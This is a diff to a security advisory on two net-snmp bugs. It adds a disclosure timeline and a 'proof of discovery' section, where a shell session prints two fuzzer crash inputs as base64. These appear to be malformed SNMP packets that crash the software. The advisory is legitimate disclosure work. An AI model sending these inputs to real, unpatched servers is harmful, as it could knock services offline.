@@ -104,10 +104,29 @@ Vuln#2: https://sourceforge.net/p/net-snmp/code/ci/7ffb8e25a0db851953155de91f017
 TIMELINE
 ========
 
-????-??-?? Vendor releases patches in version control - no public article or otherwise disclosure
+2015-04-11 Vendor releases patch of bug#1 in version control - no public article or otherwise disclosure
+2016-10-06 Vendor releases patch of bug#2 in version control - no public article or otherwise disclosure
+2018-01-05 I discovered both bugs
 2018-01-08 Vendor notified
 2018-01-08 Vendor responds - bugs already fixed in version control repo
 2018-10-08 Public disclosure of exploit
+
+
+PROOF OF DISCOVERY
+==================
+
+  root@h4xb0x:/home/magnus/projects/net-snmp/out3/crashes# cat id\:000014\,sig\:06\,src\:000732\,op\:ext_AO\,pos\:137 | base64
+  MIGfAgEBBAZwdWJsaWOhgZECATwCAQECAUAwgYUwIgYSKwYBBAGBfQgzCgIBBwqG3rc1BAwxNzIu
+  MzEuMTkuNzMwFwYSKwYBAgEBCQEEgQECAAqG3rlgAgECMCMGEgsGAQQBgX0IMwoCAQcKht63NgQN
+  MjU1LjI1NS4yNTUuMDAhBhIrBgECAQEJBgECAQoDAIbetzgECzE3Mi4zMS4xOS4y
+  root@h4xb0x:/home/magnus/projects/net-snmp/out3/crashes# cat id\:000028\,sig\:06\,src\:000386+000693\,op\:splice\,rep\:4 | base64
+  MIG1AgEDMBECBACeXRsCAwD/4wQBBQIBAwQvMC0EDYAAH4iAWdxIYUWiYyICAQgCAgq5BAVwaXBw
+  bwQMBVsKohj9MlusDerWBAAwbAQFgAAAAAYEAKFZAgQsGA29AgEAAgEAMEswDQEEAWFFg2MiBACh
+  WQIELBgNvQIBAAIBADBLMA0GCSsGAQIBAgI1LjI1NS4wMCEGEisGNS4yNTUuMAEEAYF9CDMKAgEH
+  CobetzgECzE3Mi4zMS4xOS4y
+
+https://twitter.com/magnusstubman/status/949520565064404994
+https://twitter.com/magnusstubman/status/949520650762358789
 
 
 REFERENCES
